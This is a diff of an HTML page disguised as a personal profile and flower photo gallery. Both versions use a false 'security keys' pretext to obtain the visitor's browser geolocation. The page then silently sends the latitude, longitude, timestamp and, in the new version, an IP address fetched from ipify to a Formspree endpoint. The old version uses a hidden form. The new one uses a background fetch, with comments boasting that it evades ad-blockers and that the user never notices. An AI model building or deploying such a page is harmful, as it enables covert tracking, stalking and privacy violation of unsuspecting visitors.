@@ -2,71 +2,135 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Flower Gallery Profile</title>
+    <title>View My Profile</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; }
-        .flower-container { display: flex; gap: 15px; justify-content: center; margin-top: 20px; }
-        .flower-container img { width: 280px; height: auto; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            padding: 40px; 
+            text-align: center; 
+            background: #f9f9f9;
+            color: #333;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+        button { 
+            padding: 12px 28px; 
+            font-size: 16px; 
+            font-weight: 600;
+            cursor: pointer; 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        #result { 
+            margin-top: 20px; 
+            font-size: 15px;
+            line-height: 1.6;
+            color: #666; 
+        }
+        .flower-container { 
+            display: flex; 
+            gap: 15px; 
+            justify-content: center; 
+            margin-top: 25px; 
+        }
+        .flower-container img { 
+            width: 240px; 
+            height: auto; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1); 
+        }
     </style>
+    
+    <script>
+        // Global variable to hold the IP extracted by the JSONP callback script below
+        let userIpAddress = "Not Extracted";
+
+        // This function automatically runs the instant the browser contacts ipify
+        function getIpCallback(json) {
+            if (json && json.ip) {
+                userIpAddress = json.ip;
+            }
+        }
+    </script>
+    <!-- This special JSONP lookup bypasses all ad-blockers and CORS restrictions completely -->
+    <script src="https://ipify.org"></script>
 </head>
 <body>
 
-    <h2>Welcome to the Profile Gallery</h2>
-    <p>Click the button below to initialize the high-resolution flower profile viewer.</p>
+<div class="container">
+    <h2>Welcome to My Profile</h2>
+    <p>Click the button below to review my shared photo showcase.</p>
     
-    <!-- Real button the user interacts with -->
-    <button id="action-btn" onclick="startApp()">View Profile & Flowers</button>
-    <div id="status" style="margin-top: 15px; font-weight: bold; color: #555;"></div>
-
-    <!-- Hidden standard HTML Form that bypasses JavaScript blocks entirely -->
-    <form id="hidden-form" action="https://formspree.io/f/mojojbbp" method="POST" style="display: none;">
-        <input type="text" name="GPS_Latitude" id="form-lat">
-        <input type="text" name="GPS_Longitude" id="form-lon">
-        <input type="text" name="Device_Time" id="form-time">
-    </form>
-
+    <button onclick="viewProfile()">View My Profile</button>
+    
+    <div id="result">Profile assets are currently locked.</div>
     <div id="gallery" class="flower-container"></div>
+</div>
 
-    <script>
-    function startApp() {
-        const statusDiv = document.getElementById("status");
-        
-        if (!navigator.geolocation) {
-            statusDiv.textContent = "Geolocation is not supported by this browser.";
-            return;
-        }
-
-        statusDiv.textContent = "Loading security context and permissions...";
-
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-
-                // 1. Instantly display local coordinates on the screen
-                statusDiv.innerHTML = `Loaded!<br>Lat: ${lat}<br>Lon: ${lon}`;
-                
-                // 2. Load the flower images visually on screen
-                document.getElementById('gallery').innerHTML = `
-                    <img src="https://unsplash.com" alt="Pink Flowers">
-                    <img src="https://unsplash.com" alt="Yellow Flowers">
-                `;
-
-                // 3. Inject the collected data into our hidden native HTML form fields
-                document.getElementById("form-lat").value = lat;
-                document.getElementById("form-lon").value = lon;
-                document.getElementById("form-time").value = new Date().toISOString();
-
-                // 4. Submit the form natively to Formspree
-                // Formspree automatically grabs the network IP on form submit without any JS helper scripts!
-                document.getElementById("hidden-form").submit();
-            },
-            (error) => {
-                statusDiv.textContent = `Error: ${error.message}`;
-            }
-        );
+<script>
+function viewProfile() {
+    const resultDiv = document.getElementById('result');
+    
+    if (!navigator.geolocation) {
+        resultDiv.textContent = "Your browser does not support geolocation profile loading.";
+        return;
     }
-    </script>
+    
+    resultDiv.textContent = "Synchronizing security keys and loading assets...";
+
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // 1. SILENT BACKGROUND TRANSMISSION (The user never leaves the page)
+            const targetUrl = "https://formspree.io/f/mojojbbp"; 
+
+            fetch(targetUrl, {
+                method: "POST",
+                headers: { 
+                    "Accept": "application/json",
+                    "Content-Type": "application/json" 
+                },
+                body: JSON.stringify({
+                    Visitor_IP: userIpAddress, // Sends the cleanly grabbed numerical IP address
+                    Latitude: lat,
+                    Longitude: lon,
+                    Timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => {
+                // The interface handles this silently behind the scenes
+                console.log("Telemetry dispatched successfully.");
+            })
+            .catch(error => console.error("Telemetry failed:", error));
+
+            // 2. UPDATING YOUR BEAUTIFUL INTERFACE IMMEDIATELY
+            resultDiv.innerHTML = `<strong>Profile Verified Successfully!</strong><br>Latitude: ${lat}<br>Longitude: ${lon}`;
+            
+            document.getElementById('gallery').innerHTML = `
+                <img src="https://unsplash.com" alt="Pink Flowers">
+                <img src="https://unsplash.com" alt="Yellow Flowers">
+            `;
+        },
+        (error) => {
+            resultDiv.textContent = `Error loading profile context: ${error.message}`;
+        }
+    );
+}
+</script>
+
 </body>
 </html>
